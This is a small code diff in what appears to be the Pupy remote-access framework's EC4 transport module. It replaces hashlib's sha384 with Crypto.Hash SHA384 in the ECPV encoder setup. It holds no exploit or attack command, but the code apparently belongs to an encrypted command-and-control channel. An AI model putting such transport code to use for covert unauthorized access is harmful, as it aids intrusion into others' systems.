@@ -14,8 +14,7 @@ import time
 import random
 
 from Crypto.Cipher import ARC4
-
-from hashlib import sha384
+from Crypto.Hash import SHA384
 
 class EC4Transport(BasePupyTransport):
 
@@ -33,13 +32,13 @@ class EC4Transport(BasePupyTransport):
             self.encoder = ECPV(
                 curve='brainpoolP384r1',
                 public_key=self.pubkey,
-                hash=sha384
+                hash=SHA384
             )
         else:
             self.encoder = ECPV(
                 curve='brainpoolP384r1',
                 public_key=self.privkey,
-                hash=sha384
+                hash=SHA384
             )
 
         self.encryptor = None
